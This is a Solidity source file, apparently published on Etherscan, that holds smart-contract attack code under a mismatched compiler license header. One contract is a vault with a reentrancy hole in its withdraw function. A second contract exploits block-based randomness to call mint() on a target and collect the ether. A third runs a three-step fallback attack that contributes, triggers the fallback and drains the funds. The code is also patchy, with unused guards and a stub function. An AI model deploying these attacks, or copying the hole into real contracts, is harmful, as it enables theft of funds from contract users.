/**
 *Submitted for verification at Etherscan.io on 2022-12-04
*/

/*
	This file is part of solidity.
	solidity is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.
	solidity is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.
	You should have received a copy of the GNU General Public License
	along with solidity.  If not, see <http://www.gnu.org/licenses/>.
*/
// SPDX-License-Identifier: GPL-3.0
/**
 * @author Christian <[email protected]>
 * @date 2014
 * Solidity parser.
 */

pragma solidity ^0.8.17;



interface IDao {
    function withdraw() external ;
    function deposit()external  payable;
     event Log(string); 
     event Oct(string); 
} 
contract Dao {
      IDao dao; 
    mapping(address => uint256) public balances;

constructor(address _random){
        dao = IDao(_random); 
}

    function deposit() public payable {
        require(msg.value >= 0.001 ether, "Deposits must be no less than 0.001 Ether");
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        // Check user's balance
        require(
            balances[msg.sender] >= 0.001 ether,
            "Insufficient funds.  Cannot withdraw"
        );
        uint256 bal = balances[msg.sender];

        // Withdraw user's balance
        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to withdraw sender's balance");

        // Update user's balance.
        balances[msg.sender] = 0;
    }

    function daoBalance() public view returns (uint256) {
        return address(this).balance;
    }
        function attack() public payable {
        // Seed the Dao with at least 1 Ether.
        require(msg.value >= 1 ether, "Need at least 1 ether to commence attack.");
        dao.deposit{value: msg.value}();

        // Withdraw from Dao.
        dao.withdraw();
        }
}
contract Attack {
    event Log(string);
    
    function attack(address _random) external payable {
        if (payable(_random).balance < 1){
            emit Log("All have been taken out");
        }
        else{
            if(uint256(keccak256(abi.encodePacked(block.difficulty,block.timestamp))) % 2 == 0) {
                emit Log("failed to get rand, wait 10 seconds");
            }
            else{
                (bool ok,) = _random.call(abi.encodeWithSignature("mint()"));
                if( !ok ){
                    emit Log("failed to call mint()");
                }
                else{
                    emit Log("succeeded getting eth");
                }
            }
        }
    }

    // 查看获利余额
    function getBalance() external view returns(uint256) {
        return address(this).balance;
    }    

    // 接收攻击获得的Eth
    receive() external payable {}
}
contract Att {
    event Oct(string); 
    
    address payable public attacker;
    bytes4 private constant CONTRIBUTE_SELCTOR = bytes4(keccak256(bytes("contribute()")));
    bytes4 private constant WITHDRAW_SELECTOR = bytes4(keccak256(bytes("withdraw()")));

    modifier onlyAttacker() {
        require(msg.sender == attacker, "FallbackAttack: Only attacker can perform the action.");
        _;
    }

    function attack(address _random) external payable onlyAttacker  {
        require(msg.value >= 0.001 ether, "FallbackAttack: Not enough ethers to attack.");

         bool success;
        /// @notice - STEP 1: contribute for a very small amount of ether:
        (success, ) = _random.call{value: 0.0001 ether}(abi.encodeWithSelector(CONTRIBUTE_SELCTOR));
       

        /// @notice - STEP 2: call the fallback function by sending ether to the contract
        (success, ) = _random.call{value: 0.0001 ether}("");
        require(success, "FallbackAttack: Send Ether failed.");

        /// @notice - STEP 3: withdraw funds
        (success, ) = _random.call(abi.encodeWithSelector(WITHDRAW_SELECTOR));
        require(success, "FallbackAttack: Withdraw failed.");
    }
constructor() {
        attacker = payable(msg.sender);
}
 function  balances()public view returns (uint){
        return address(this).balance;
   
    }
bool internal locked;

   modifier noReentrancy() {
        require(!locked, "No reentrancy");
        locked = true;
        _;
        locked = false;
    }

 //……
    function withdraw() public noReentrancy { 

    // withdraw logic goes here…
    }
}